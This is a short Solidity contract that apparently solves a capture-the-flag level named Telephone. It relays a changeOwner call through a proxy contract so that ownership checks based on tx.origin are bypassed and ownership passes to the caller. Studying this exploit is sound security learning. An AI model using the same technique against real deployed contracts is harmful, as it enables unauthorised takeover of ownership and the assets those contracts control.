// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Telephone} from "./Telephone.sol";

contract ProxyCall {
    function forward(Telephone _to) public {
        _to.changeOwner(msg.sender);
    }
}
